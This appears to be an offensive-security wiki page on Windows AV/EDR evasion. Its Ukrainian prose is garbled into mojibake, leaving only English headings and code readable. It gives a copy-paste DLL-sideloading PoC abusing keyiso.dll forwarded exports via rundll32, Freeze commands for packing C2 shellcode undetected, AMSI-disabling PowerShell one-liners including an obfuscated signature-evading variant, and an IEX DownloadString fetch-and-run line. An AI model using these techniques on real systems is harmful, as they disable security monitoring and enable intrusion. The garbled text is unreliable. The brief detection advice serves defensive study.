### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules –º–æ–∂—É—Ç—å –µ–∫—Å–ø–æ—Ä—Ç—É–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—ó, —è–∫—ñ —Ñ–∞–∫—Ç–∏—á–Ω–æ —î "forwarders": –∑–∞–º—ñ—Å—Ç—å –≤–∫–∞–∑—ñ–≤–∫–∏ –Ω–∞ –∫–æ–¥, –∑–∞–ø–∏—Å –µ–∫—Å–ø–æ—Ä—Ç—É –º—ñ—Å—Ç–∏—Ç—å ASCII-—Ä—è–¥–æ–∫ —É —Ñ–æ—Ä–º—ñ `TargetDll.TargetFunc`. –ö–æ–ª–∏ –≤–∏–∫–ª–∏–∫–∞—á —Ä–æ–∑–≤'—è–∑—É—î –µ–∫—Å–ø–æ—Ä—Ç, Windows loader –∑—Ä–æ–±–∏—Ç—å:

- –ó–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç—å `TargetDll`, —è–∫—â–æ –≤—ñ–Ω —â–µ –Ω–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏–π
- –û—Ç—Ä–∏–º–∞—î –∑ –Ω—å–æ–≥–æ `TargetFunc`

–ö–ª—é—á–æ–≤—ñ –º–æ–º–µ–Ω—Ç–∏ –¥–ª—è —Ä–æ–∑—É–º—ñ–Ω–Ω—è:
- –Ø–∫—â–æ `TargetDll` —î KnownDLL, –≤—ñ–Ω –ø–æ—Å—Ç–∞—á–∞—î—Ç—å—Å—è –∑ –∑–∞—Ö–∏—â–µ–Ω–æ–≥–æ –ø—Ä–æ—Å—Ç–æ—Ä—É —ñ–º–µ–Ω KnownDLLs (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, ntdll, kernelbase, ole32).
- –Ø–∫—â–æ `TargetDll` –Ω–µ —î KnownDLL, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –∑–≤–∏—á–∞–π–Ω–∏–π –ø–æ—Ä—è–¥–æ–∫ –ø–æ—à—É–∫—É DLL, —è–∫–∏–π –≤–∫–ª—é—á–∞—î –∫–∞—Ç–∞–ª–æ–≥ –º–æ–¥—É–ª—è, —â–æ –≤–∏–∫–æ–Ω—É—î —Ä–æ–∑–≤'—è–∑–∞–Ω–Ω—è –ø–µ—Ä–µ—Å–ø—Ä—è–º—É–≤–∞–Ω–Ω—è.

–¶–µ –¥–∞—î –∑–º–æ–≥—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –Ω–µ–ø—Ä—è–º—É –ø—Ä–∏–º—ñ—Ç–∏–≤ sideloading: –∑–Ω–∞–π—Ç–∏ –ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π DLL, —è–∫–∏–π –µ–∫—Å–ø–æ—Ä—Ç—É—î —Ñ—É–Ω–∫—Ü—ñ—é, –ø–µ—Ä–µ—Å–ø—Ä—è–º–æ–≤–∞–Ω—É –Ω–∞ —ñ–º'—è –º–æ–¥—É–ª—è, —â–æ –Ω–µ —î KnownDLL, –ø–æ—Ç—ñ–º –ø–æ–º—ñ—Å—Ç–∏—Ç–∏ –ø–æ—Ä—É—á —Ü–µ–π –ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π DLL —Ç–∞ attacker-controlled DLL —ñ–∑ —Ç–æ—á–Ω–æ —Ç–∞–∫–∏–º —Å–∞–º–∏–º —ñ–º'—è–º —Ü—ñ–ª—å–æ–≤–æ–≥–æ –º–æ–¥—É–ª—è –ø–µ—Ä–µ—Å–ø—Ä—è–º—É–≤–∞–Ω–Ω—è. –ö–æ–ª–∏ –ø–µ—Ä–µ—Å–ø—Ä—è–º–æ–≤–∞–Ω–∏–π –µ–∫—Å–ø–æ—Ä—Ç –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è, –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—á —Ä–æ–∑–≤'—è–∑—É—î –ø–µ—Ä–µ—Å–ø—Ä—è–º—É–≤–∞–Ω–Ω—è —ñ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î –≤–∞—à DLL –∑ —Ç–æ–≥–æ —Å–∞–º–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É, –≤–∏–∫–æ–Ω—É—é—á–∏ –≤–∞—à DllMain.

–ü—Ä–∏–∫–ª–∞–¥, —Å–ø–æ—Å—Ç–µ—Ä–µ–∂–µ–Ω–∏–π —É Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` –Ω–µ —î KnownDLL, —Ç–æ–º—É –≤—ñ–Ω –≤–∏—Ä—ñ—à—É—î—Ç—å—Å—è –∑–∞ –∑–≤–∏—á–∞–π–Ω–∏–º –ø–æ—Ä—è–¥–∫–æ–º –ø–æ—à—É–∫—É.

PoC (copy-paste):
1) –°–∫–æ–ø—ñ—é–π—Ç–µ –ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π —Å–∏—Å—Ç–µ–º–Ω–∏–π DLL –¥–æ –ø–∞–ø–∫–∏ –∑ –ø—Ä–∞–≤–∞–º–∏ –∑–∞–ø–∏—Å—É
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) –ü–æ–º—ñ—Å—Ç—ñ—Ç—å –∑–ª–æ–≤–º–∏—Å–Ω–∏–π `NCRYPTPROV.dll` —É —Ç—É —Å–∞–º—É –ø–∞–ø–∫—É. –î–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É –¥–æ—Å—Ç–∞—Ç–Ω—å–æ –º—ñ–Ω—ñ–º–∞–ª—å–Ω–æ–≥–æ `DllMain`; –≤–∞–º –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ —Ä–µ–∞–ª—ñ–∑–æ–≤—É–≤–∞—Ç–∏ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω—É —Ñ—É–Ω–∫—Ü—ñ—é, —â–æ–± –≤–∏–∫–ª–∏–∫–∞—Ç–∏ `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) –Ü–Ω—ñ—Ü—ñ—é–π—Ç–µ –ø–µ—Ä–µ—Å–∏–ª–∞–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø—ñ–¥–ø–∏—Å–∞–Ω–æ–≥–æ LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
–°–ø–æ—Å—Ç–µ—Ä–µ–∂—É–≤–∞–Ω–∞ –ø–æ–≤–µ–¥—ñ–Ω–∫–∞:
- rundll32 (–ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π) –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î side-by-side `keyiso.dll` (–ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π)
- –ü—ñ–¥ —á–∞—Å —Ä–æ–∑–≤'—è–∑—É–≤–∞–Ω–Ω—è `KeyIsoSetAuditingInterface` –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—á –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç—å –ø–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—é –¥–æ `NCRYPTPROV.SetAuditingInterface`
- –ó–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—á –ø–æ—Ç—ñ–º –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î `NCRYPTPROV.dll` –∑ `C:\test` —ñ –≤–∏–∫–æ–Ω—É—î –π–æ–≥–æ `DllMain`
- –Ø–∫—â–æ `SetAuditingInterface` –Ω–µ —Ä–µ–∞–ª—ñ–∑–æ–≤–∞–Ω–æ, –≤–∏ –æ—Ç—Ä–∏–º–∞—î—Ç–µ –ø–æ–º–∏–ª–∫—É "missing API" –ª–∏—à–µ –ø—ñ—Å–ª—è —Ç–æ–≥–æ, —è–∫ `DllMain` –≤–∂–µ –≤–∏–∫–æ–Ω–∞–≤—Å—è

–ü–æ—Ä–∞–¥–∏ –¥–ª—è –ø–æ—à—É–∫—É:
- –ó–æ—Å–µ—Ä–µ–¥—å—Ç–µ—Å—è –Ω–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—Ö –µ–∫—Å–ø–æ—Ä—Ç—ñ–≤ (forwarded exports), –¥–µ —Ü—ñ–ª—å–æ–≤–∏–π –º–æ–¥—É–ª—å –Ω–µ —î KnownDLL. KnownDLLs –ø–µ—Ä–µ–ª—ñ—á–µ–Ω—ñ –ø—ñ–¥ `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- –í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω—ñ –µ–∫—Å–ø–æ—Ä—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- –ü–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ —ñ–Ω–≤–µ–Ω—Ç–∞—Ä Windows 11 forwarder, —â–æ–± —à—É–∫–∞—Ç–∏ –∫–∞–Ω–¥–∏–¥–∞—Ç—ñ–≤: https://hexacorn.com/d/apis_fwd.txt

–Ü–¥–µ—ó –≤–∏—è–≤–ª–µ–Ω–Ω—è/–∑–∞—Ö–∏—Å—Ç—É:
- –ú–æ–Ω—ñ—Ç–æ—Ä—å—Ç–µ LOLBins (e.g., rundll32.exe), —è–∫—ñ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—Ç—å –ø—ñ–¥–ø–∏—Å–∞–Ω—ñ DLLs —ñ–∑ –Ω–µ—Å–∏—Å—Ç–µ–º–Ω–∏—Ö —à–ª—è—Ö—ñ–≤, –∞ –ø–æ—Ç—ñ–º —ñ–∑ —Ç–æ–≥–æ –∂ –∫–∞—Ç–∞–ª–æ–≥—É –∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—Ç—å non-KnownDLLs –∑ —Ç—ñ—î—é –∂ –±–∞–∑–æ–≤–æ—é –Ω–∞–∑–≤–æ—é
- –ù–∞–ª–∞—à—Ç—É–π—Ç–µ –æ–ø–æ–≤—ñ—â–µ–Ω–Ω—è –Ω–∞ –ª–∞–Ω—Ü—é–∂–∫–∏ –ø—Ä–æ—Ü–µ—Å—ñ–≤/–º–æ–¥—É–ª—ñ–≤, —Ç–∞–∫—ñ —è–∫: `rundll32.exe` ‚Üí non-system `keyiso.dll` ‚Üí `NCRYPTPROV.dll` —É —à–ª—è—Ö–∞—Ö, –¥–æ—Å—Ç—É–ø–Ω–∏—Ö –¥–ª—è –∑–∞–ø–∏—Å—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º
- –í–ø—Ä–æ–≤–∞–¥—å—Ç–µ –ø–æ–ª—ñ—Ç–∏–∫–∏ —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ –∫–æ–¥—É (WDAC/AppLocker) —ñ –∑–∞–±–æ—Ä–æ–Ω—ñ—Ç—å –æ–¥–Ω–æ—á–∞—Å–Ω–∏–π –∑–∞–ø–∏—Å —ñ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤ –∫–∞—Ç–∞–ª–æ–≥–∞—Ö –¥–æ–¥–∞—Ç–∫—ñ–≤

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ Freeze –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤–∞—à–æ–≥–æ shellcode —É –ø—Ä–∏—Ö–æ–≤–∞–Ω–æ–º—É —Ä–µ–∂–∏–º—ñ.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> –£—Ö–∏–ª–µ–Ω–Ω—è ‚Äî —Ü–µ –≥—Ä–∞ –≤ –∫–æ—Ç–∏–∫–∞ —Ç–∞ –º–∏—à–∫—É: —Ç–µ, —â–æ –ø—Ä–∞—Ü—é—î —Å—å–æ–≥–æ–¥–Ω—ñ, –º–æ–∂–µ –±—É—Ç–∏ –≤–∏—è–≤–ª–µ–Ω–µ –∑–∞–≤—Ç—Ä–∞. –¢–æ–º—É –Ω—ñ–∫–æ–ª–∏ –Ω–µ –ø–æ–∫–ª–∞–¥–∞–π—Ç–µ—Å—å –ª–∏—à–µ –Ω–∞ –æ–¥–∏–Ω —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç; –∑–∞ –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –Ω–∞–º–∞–≥–∞–π—Ç–µ—Å—å –ª–∞–Ω—Ü—é–∂–∏—Ç–∏ –¥–µ–∫—ñ–ª—å–∫–∞ —Ç–µ—Ö–Ω—ñ–∫ —É—Ö–∏–ª–µ–Ω–Ω—è.

## AMSI (Anti-Malware Scan Interface)

AMSI –±—É–ª–æ —Å—Ç–≤–æ—Ä–µ–Ω–æ –¥–ª—è –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". –°–ø–æ—á–∞—Ç–∫—É AV –º–æ–≥–ª–∏ —Å–∫–∞–Ω—É–≤–∞—Ç–∏ –ª–∏—à–µ **files on disk**, —Ç–æ–∂ —è–∫—â–æ –≤–¥–∞–≤–∞–ª–æ—Å—å —è–∫–æ—Å—å –≤–∏–∫–æ–Ω–∞—Ç–∏ payloads **directly in-memory**, AV –Ω—ñ—á–æ–≥–æ –Ω–µ –º—ñ–≥ –≤–¥—ñ—è—Ç–∏ —á–µ—Ä–µ–∑ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å –≤–∏–¥–∏–º–æ—Å—Ç—ñ.

–§—É–Ω–∫—Ü—ñ—è AMSI —ñ–Ω—Ç–µ–≥—Ä–æ–≤–∞–Ω–∞ –≤ —Ç–∞–∫—ñ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∏ Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

–í–æ–Ω–∞ –¥–æ–∑–≤–æ–ª—è—î –∞–Ω—Ç–∏–≤—ñ—Ä—É—Å–Ω–∏–º —Ä—ñ—à–µ–Ω–Ω—è–º —ñ–Ω—Å–ø–µ–∫—Ç—É–≤–∞—Ç–∏ –ø–æ–≤–µ–¥—ñ–Ω–∫—É —Å–∫—Ä–∏–ø—Ç—ñ–≤, –Ω–∞–¥–∞—é—á–∏ –≤–º—ñ—Å—Ç —Å–∫—Ä–∏–ø—Ç—ñ–≤ —É –≤–∏–≥–ª—è–¥—ñ, —è–∫–∏–π –Ω–µ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π —ñ –Ω–µ –æ–±—Ñ—É—Å—Ü–æ–≤–∞–Ω–∏–π.

–í–∏–∫–æ–Ω–∞–Ω–Ω—è `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ —Å–ø–æ–≤—ñ—â–µ–Ω–Ω—è –≤ Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤–æ–Ω–æ –¥–æ–¥–∞—î –ø—Ä–µ—Ñ—ñ–∫—Å `amsi:` —Ç–∞ –ø–æ—Ç—ñ–º —à–ª—è—Ö –¥–æ –≤–∏–∫–æ–Ω—É–≤–∞–Ω–æ–≥–æ —Ñ–∞–π–ª—É, –∑ —è–∫–æ–≥–æ –±—É–≤ –∑–∞–ø—É—â–µ–Ω–∏–π —Å–∫—Ä–∏–ø—Ç ‚Äî —É —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É, powershell.exe

–ú–∏ –Ω–µ —Å–∫–∏–¥–∞–ª–∏ –∂–æ–¥–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ –Ω–∞ –¥–∏—Å–∫, –∞–ª–µ –≤—Å–µ –æ–¥–Ω–æ –±—É–ª–∏ –≤–∏—è–≤–ª–µ–Ω—ñ –≤ –ø–∞–º'—è—Ç—ñ —á–µ—Ä–µ–∑ AMSI.

–ö—Ä—ñ–º —Ç–æ–≥–æ, –ø–æ—á–∏–Ω–∞—é—á–∏ –∑ **.NET 4.8**, C# –∫–æ–¥ —Ç–∞–∫–æ–∂ –ø—Ä–æ–≥–∞–Ω—è—î—Ç—å—Å—è —á–µ—Ä–µ–∑ AMSI. –¶–µ –Ω–∞–≤—ñ—Ç—å –≤–ø–ª–∏–≤–∞—î –Ω–∞ `Assembly.Load(byte[])` –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤ –ø–∞–º'—è—Ç—ñ. –¢–æ–º—É –¥–ª—è in-memory execution, —è–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –æ–±—ñ–π—Ç–∏ AMSI, —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –Ω–∏–∂—á—ñ –≤–µ—Ä—Å—ñ—ó .NET (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥ 4.7.2 –∞–±–æ –Ω–∏–∂—á–µ).

–Ñ –∫—ñ–ª—å–∫–∞ —Å–ø–æ—Å–æ–±—ñ–≤ –æ–±—ñ–π—Ç–∏ AMSI:

- **Obfuscation**

–û—Å–∫—ñ–ª—å–∫–∏ AMSI –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –ø—Ä–∞—Ü—é—î –∑—ñ static detections, –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—è —Å–∫—Ä–∏–ø—Ç—ñ–≤, —è–∫—ñ –≤–∏ –Ω–∞–º–∞–≥–∞—î—Ç–µ—Å—å –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏, –º–æ–∂–µ –±—É—Ç–∏ —Ö–æ—Ä–æ—à–∏–º —Å–ø–æ—Å–æ–±–æ–º —É—Ö–∏–ª–µ–Ω–Ω—è –≤—ñ–¥ –≤–∏—è–≤–ª–µ–Ω–Ω—è.

–û–¥–Ω–∞–∫ AMSI –º–∞—î –∑–¥–∞—Ç–Ω—ñ—Å—Ç—å —Ä–æ–∑–¥–µ–±—Ñ—É—Å—Ü–∏–≤—É–≤–∞—Ç–∏ —Å–∫—Ä–∏–ø—Ç–∏ –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–æ–Ω–∏ –º–∞—é—Ç—å –∫—ñ–ª—å–∫–∞ —à–∞—Ä—ñ–≤ –æ–±—Ñ—É—Å–∫–∞—Ü—ñ—ó, —Ç–æ–º—É –æ–±—Ñ—É—Å–∫–∞—Ü—ñ—è –º–æ–∂–µ –±—É—Ç–∏ –ø–æ–≥–∞–Ω–∏–º –≤–∞—Ä—ñ–∞–Ω—Ç–æ–º –∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ç–æ–≥–æ, —è–∫ –≤–æ–Ω–∞ –∑—Ä–æ–±–ª–µ–Ω–∞. –¶–µ —É—Å–∫–ª–∞–¥–Ω—é—î –ø—Ä–æ—Å—Ç–µ —É—Ö–∏–ª–µ–Ω–Ω—è. –•–æ—á–∞ —ñ–Ω–æ–¥—ñ –¥–æ—Å—Ç–∞—Ç–Ω—å–æ –∑–º—ñ–Ω–∏—Ç–∏ –∫—ñ–ª—å–∫–∞ —ñ–º–µ–Ω –∑–º—ñ–Ω–Ω–∏—Ö ‚Äî —ñ –≤—Å–µ –±—É–¥–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏, —Ç–æ–∂ —É—Å–µ –∑–∞–ª–µ–∂–∏—Ç—å –≤—ñ–¥ —Ç–æ–≥–æ, –Ω–∞—Å–∫—ñ–ª—å–∫–∏ —Å–∏–ª—å–Ω–æ —â–æ—Å—å –±—É–ª–æ –ø–æ–∑–Ω–∞—á–µ–Ω–æ.

- **AMSI Bypass**

–û—Å–∫—ñ–ª—å–∫–∏ AMSI —Ä–µ–∞–ª—ñ–∑–æ–≤–∞–Ω–æ —à–ª—è—Ö–æ–º –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è DLL —É –ø—Ä–æ—Ü–µ—Å powershell (–∞ —Ç–∞–∫–æ–∂ cscript.exe, wscript.exe —Ç–æ—â–æ), –∑ –Ω–∏–º –º–æ–∂–Ω–∞ –≤—ñ–¥–Ω–æ—Å–Ω–æ –ª–µ–≥–∫–æ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ –Ω–∞–≤—ñ—Ç—å –ø—ñ–¥ –Ω–µ–ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º. –ß–µ—Ä–µ–∑ —Ü—é –Ω–µ–¥–æ—Å–∫–æ–Ω–∞–ª—ñ—Å—Ç—å —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—ó AMSI –¥–æ—Å–ª—ñ–¥–Ω–∏–∫–∏ –∑–Ω–∞–π—à–ª–∏ –∫—ñ–ª—å–∫–∞ —Å–ø–æ—Å–æ–±—ñ–≤ —É—Ö–∏–ª–∏—Ç–∏—Å—è –≤—ñ–¥ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è AMSI.

**Forcing an Error**

–ü—Ä–∏–º—É—Å–æ–≤–µ –Ω–µ–≤–¥–∞–ª–µ —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑—É–≤–∞–Ω–Ω—è AMSI (amsiInitFailed) –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ —Ç–æ–≥–æ, —â–æ –¥–ª—è –ø–æ—Ç–æ—á–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É –Ω–µ –±—É–¥–µ —ñ–Ω—ñ—Ü—ñ–π–æ–≤–∞–Ω–æ –∂–æ–¥–Ω–æ–≥–æ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è. –°–ø–æ—á–∞—Ç–∫—É —Ü–µ –±—É–ª–æ —Ä–æ–∑–∫—Ä–∏—Ç–æ [Matt Graeber](https://twitter.com/mattifestation), —ñ Microsoft —Ä–æ–∑—Ä–æ–±–∏–≤ —Å–∏–≥–Ω–∞—Ç—É—Ä—É, —â–æ–± –∑–∞–ø–æ–±—ñ–≥—Ç–∏ —à–∏—Ä–æ–∫–æ–º—É –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—é.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
–£—Å–µ, —â–æ –∑–Ω–∞–¥–æ–±–∏–ª–æ—Å—è, ‚Äî –æ–¥–∏–Ω —Ä—è–¥–æ–∫ –∫–æ–¥—É powershell, —â–æ–± –∑—Ä–æ–±–∏—Ç–∏ AMSI –Ω–µ–ø—Ä–∏–¥–∞—Ç–Ω–∏–º –¥–ª—è –ø–æ—Ç–æ—á–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É powershell. –¶–µ–π —Ä—è–¥–æ–∫, –∑–≤—ñ—Å–Ω–æ, –±—É–≤ –ø–æ–º—ñ—á–µ–Ω–∏–π —Å–∞–º–∏–º AMSI, —Ç–æ–º—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–Ω–µ—Å—Ç–∏ –¥–µ—è–∫—ñ –∑–º—ñ–Ω–∏, —â–æ–± –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É.

–û—Å—å –∑–º—ñ–Ω–µ–Ω–∏–π AMSI bypass, —è–∫–∏–π —è –≤–∑—è–≤ —ñ–∑ —Ü—å–æ–≥–æ [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic n¬∫ 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.M√Ç¬£n√Ç¬£g' + 'e@+nt.Auto@' + '√Ç¬£tion.A' -join ''
$fdx = '@ms' + '√Ç¬£In√Ç¬£' + 'tF@√Ç¬£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('√Ç¬£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('√Ç¬£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
–ú–∞–π—Ç–µ –Ω–∞ —É–≤–∞–∑—ñ, —â–æ —Ü–µ, –π–º–æ–≤—ñ—Ä–Ω–æ, –±—É–¥–µ –ø–æ–º—ñ—á–µ–Ω–æ –ø—ñ—Å–ª—è –ø—É–±–ª—ñ–∫–∞—Ü—ñ—ó, —Ç–æ–º—É –Ω–µ —Å–ª—ñ–¥ –ø—É–±–ª—ñ–∫—É–≤–∞—Ç–∏ –∫–æ–¥, —è–∫—â–æ –≤–∞—à–∞ –º–µ—Ç–∞ ‚Äî –∑–∞–ª–∏—à–∏—Ç–∏—Å—è –Ω–µ–ø–æ–º—ñ—á–µ–Ω–∏–º.

**Memory Patching**

–¶—é —Ç–µ—Ö–Ω—ñ–∫—É —Å–ø–æ—á–∞—Ç–∫—É –≤–∏—è–≤–∏–≤ [@RastaMouse](https://twitter.com/_RastaMouse/) —ñ –≤–æ–Ω–∞ –ø–æ–ª—è–≥–∞—î —É –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—ñ –∞–¥—Ä–µ—Å–∏ —Ñ—É–Ω–∫—Ü—ñ—ó "AmsiScanBuffer" –≤ amsi.dll (–≤—ñ–¥–ø–æ–≤—ñ–¥–∞–ª—å–Ω–æ—ó –∑–∞ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –≤–≤–µ–¥–µ–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º –¥–∞–Ω–∏—Ö) —Ç–∞ –ø–µ—Ä–µ–∑–∞–ø–∏—Å—ñ —ó—ó —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è–º–∏, —â–æ –ø–æ–≤–µ—Ä—Ç–∞—é—Ç—å –∫–æ–¥ E_INVALIDARG; —Ç–∞–∫–∏–º —á–∏–Ω–æ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç —Ñ–∞–∫—Ç–∏—á–Ω–æ–≥–æ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è —Å—Ç–∞–Ω–µ 0, —â–æ —Ç–ª—É–º–∞—á–∏—Ç—å—Å—è —è–∫ —á–∏—Å—Ç–∏–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç.

> [!TIP]
> –ë—É–¥—å –ª–∞—Å–∫–∞, –ø—Ä–æ—á–∏—Ç–∞–π—Ç–µ [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) –¥–ª—è –¥–µ—Ç–∞–ª—å–Ω—ñ—à–æ–≥–æ –ø–æ—è—Å–Ω–µ–Ω–Ω—è.

